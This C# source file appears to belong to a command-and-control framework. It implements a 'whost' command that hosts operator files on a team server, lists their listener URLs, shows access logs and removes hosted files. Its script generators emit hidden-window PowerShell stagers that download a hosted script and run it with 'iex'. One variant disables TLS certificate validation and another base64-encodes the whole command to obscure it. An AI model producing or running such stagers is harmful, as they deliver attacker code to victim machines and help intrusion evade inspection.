using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common;
using Commander.Models;
using Spectre.Console;

namespace Commander.Commands
{
    public class WebHostVerbs
    {
        public const string Show = "show";
        public const string Push = "push";
        public const string Remove = "rm";
        public const string Log = "log";
        public const string Script = "script";
        public const string Clear = "clear";
    }

    public class WebHostCommandOptions
    {
        public string verb { get; set; }
        public string path { get; set; }
        public string file { get; set; }
        public bool powershell { get; set; }
        public string description { get; set; }

        public string listener { get; set; }
    }

    public class WebHostCommand : EnhancedCommand<WebHostCommandOptions>
    {
        public override string Category => CommandCategory.Network;
        public override string Description => "WebHost file on the TeasmServer";
        public override string Name => "whost";

        public override ExecutorMode AvaliableIn => ExecutorMode.All;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("verb").FromAmong(WebHostVerbs.Push, WebHostVerbs.Remove, WebHostVerbs.Show, WebHostVerbs.Script, WebHostVerbs.Log, WebHostVerbs.Clear),

                new Option<string>(new[] { "--file", "-f" }, () => null, "Path of the local file to push (" + WebHostVerbs.Push + ")"),
                new Option<string>(new[] { "--path", "-p" }, () => null, "Hosting path (" + WebHostVerbs.Push + "," + WebHostVerbs.Show + ")"),
                new Option<bool>(new[] { "--powershell", "-ps" }, () => false, "Specify is the file is a powershell script (" + WebHostVerbs.Push + ")"),
                new Option<string>(new[] { "--description", "-d" }, () => null, "Description of the file (" + WebHostVerbs.Push + ")"),
                new Option<string>(new[] { "--listener", "-l" }, () => null, "filter on specific listener (" + WebHostVerbs.Show + ")"),
            };

        protected async override Task<bool> HandleCommand(CommandContext<WebHostCommandOptions> context)
        {
            if (!this.Validate(context))
            {
                return false;
            }

            if (context.Options.verb == WebHostVerbs.Push)
            {
                byte[] fileBytes = File.ReadAllBytes(context.Options.file);

                await context.CommModule.WebHost(context.Options.path, fileBytes, context.Options.powershell, context.Options.description);

                context.Terminal.WriteSuccess($"File {context.Options.file} hosted on {context.Options.path}.");
                return true;
            }


            if (context.Options.verb == WebHostVerbs.Show || context.Options.verb == WebHostVerbs.Script)
            {
                var list = await context.CommModule.GetWebHosts();
                if (!string.IsNullOrEmpty(context.Options.path))
                {
                    if (!list.Any(h => h.Path.ToLower() == context.Options.path.ToLower()))
                    {
                        context.Terminal.WriteError($"[X] Host {context.Options.path} not found");
                        return false;
                    }
                    else
                        list = new List<ApiModels.WebHost.FileWebHost> { list.First(h => h.Path.ToLower() == context.Options.path.ToLower()) };
                }


                List<Models.Listener> listeners = null;
                if (!string.IsNullOrEmpty(context.Options.listener))
                    listeners = new List<Models.Listener>() { context.CommModule.GetListeners().First(l => l.Name.ToLower() == context.Options.listener.ToLower()) };
                else
                    listeners = context.CommModule.GetListeners().ToList();

                foreach (var listener in listeners)
                {
                    var rule = new Rule(listener.Name);
                    rule.Style = Style.Parse("cyan");
                    context.Terminal.Write(rule);

                    if (context.Options.verb == WebHostVerbs.Show)
                    {
                        var table = new Table();
                        table.Border(TableBorder.Rounded);
                        table.AddColumn(new TableColumn("Url").LeftAligned());
                        table.AddColumn(new TableColumn("PowerShell").Centered());
                        table.AddColumn(new TableColumn("Description").LeftAligned());
                        //table.AddColumn(new TableColumn("Script").LeftAligned());


                        foreach (var item in list)
                        {
                            var url = listener.EndPoint + "/" +  item.Path;
                            table.AddRow(
                                url,
                                item.IsPowershell ? "Yes" : "No",
                                item.Description ?? String.Empty
                                );
                        }
                        table.Expand();
                        context.Terminal.Write(table);
                    }

                    if (context.Options.verb == WebHostVerbs.Script)
                    {
                        foreach (var item in list.Where(i => i.IsPowershell))
                        {
                            var url = listener.EndPoint + "/" +  item.Path;
                            context.Terminal.WriteLineMarkup($"[grey]{url}[/]");
                            context.Terminal.WriteLine(GeneratePowershellScript(url, listener.Secured));
                        }
                    }
                }

                return true;
            }

            if (context.Options.verb == WebHostVerbs.Log)
            {
                var list = await context.CommModule.GetWebHostLogs();

                var table = new Table();
                table.Border(TableBorder.Rounded);
                table.AddColumn(new TableColumn("Date").LeftAligned());
                table.AddColumn(new TableColumn("Url").Centered());
                table.AddColumn(new TableColumn("UserAgent").LeftAligned());
                table.AddColumn(new TableColumn("StatusCode").LeftAligned());

                foreach (var item in list)
                {
                    if (item == null)
                        continue;



                    table.AddRow(
                        item.Date.ToLocalTime().ToString(),
                        item.Url,
                        item.UserAgent,
                        item.StatusCode.ToString()
                        );
                }

                table.Expand();
                context.Terminal.Write(table);

                return true;
            }

            if (context.Options.verb == WebHostVerbs.Remove)
            {
                var list = await context.CommModule.GetWebHosts();
                if (!list.Any(h => h.Path.ToLower() == context.Options.path.ToLower()))
                {
                    context.Terminal.WriteError($"[X] Host {context.Options.path} not found");
                    return false;
                }

                await context.CommModule.RemoveWebHost(context.Options.path);

                context.Terminal.WriteSuccess($"[*] {context.Options.path} removed from Web Hosting");
                return true;
            }

            if (context.Options.verb == WebHostVerbs.Clear)
            {
                await context.CommModule.ClearWebHosts();
                context.Terminal.WriteSuccess("[*] Web hosting cleared ");
                return true;
            }

            return true;
        }

        public const string PowershellSSlScript = "add-type 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}';[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy;";

        public static string GeneratePowershellScript(string url, bool isSecured)
        {
            string script = string.Empty;

            if (isSecured)
                script += PowershellSSlScript;

            script += $"(New-Object Net.WebClient).DownloadString('{url}') | iex";

            return $"powershell -noP -sta -w 1 -c \"{script}\"";
        }

        public static string GeneratePowershellScriptB64(string url, bool isSecured)
        {
            string script = string.Empty;

            if (isSecured)
                script += PowershellSSlScript;

            script += $"(New-Object Net.WebClient).DownloadString('{url}') | iex";
            string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            return $"powershell -noP -sta -w 1 -e {enc64}";
        }

        public bool Validate(CommandContext<WebHostCommandOptions> context)
        {
            if (context.Options.verb == WebHostVerbs.Push)
            {
                if (string.IsNullOrEmpty(context.Options.file))
                {
                    context.Terminal.WriteError($"[X] File is mandatory");
                    return false;
                }

                if (string.IsNullOrEmpty(context.Options.path))
                {
                    context.Terminal.WriteError($"[X] Path is mandatory");
                    return false;
                }

                if (!File.Exists(context.Options.file))
                {
                    context.Terminal.WriteError($"[X] File {context.Options.file} not found");
                    return false;
                }
            }

            if (context.Options.verb == WebHostVerbs.Show)
            {
                if (!string.IsNullOrEmpty(context.Options.listener) && !context.CommModule.GetListeners().Any(l => l.Name.ToLower() == context.Options.listener.ToLower()))
                {
                    context.Terminal.WriteError($"[X] Listener {context.Options.listener} not found");
                    return false;
                }
            }

            if (context.Options.verb == WebHostVerbs.Remove)
            {
                if (string.IsNullOrEmpty(context.Options.path))
                {
                    context.Terminal.WriteError($"[X] Path is mandatory");
                    return false;
                }
            }

            return true;
        }
    }


}
